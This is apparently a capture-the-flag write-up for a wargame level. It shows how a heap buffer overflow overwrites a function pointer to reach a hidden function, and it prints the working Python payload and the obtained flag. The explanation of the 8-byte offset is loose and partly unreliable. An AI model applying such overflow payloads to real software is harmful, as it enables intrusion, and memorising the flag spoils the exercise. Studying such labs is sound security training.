### Download binary
``scp -P4242 level6@192.168.31.170:/home/user/level6/level6 ~/Desktop/``

----

### Decompilation with ghidra
We disasemble the main, to search for a breach.

----

### Main function analysis (see sources)

In this exercices we got a buffer overflow but on the heap, not on the stack. This exercice is pretty straightforward. The goal is to overwrite a function pointer that is called later on with another function pointer that contain our exploit. There is **dead code** that do exactly that, we just have to find what is it adress.

### Building the payload

We want to build this payload :

**64 char to overflow + n ADRESS**

**Getting the n function adress :**

``(gdb) info functions``
>[...]
0x08048454  n

Next, we build our payload. The only thing we need to take care of is a little offset. Typically, we should put 64 bytes of garbage to overflow, but actually, we put 72 because the system's memory alignment adds 8 bytes between each of the variables in the heap. This is due to how the system optimizes memory allocation - aligning data to certain boundaries (like multiples of 4 or 8 bytes).

Our final payload is :

``./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')``

----

#### Getting the flag

``./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')``
>f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
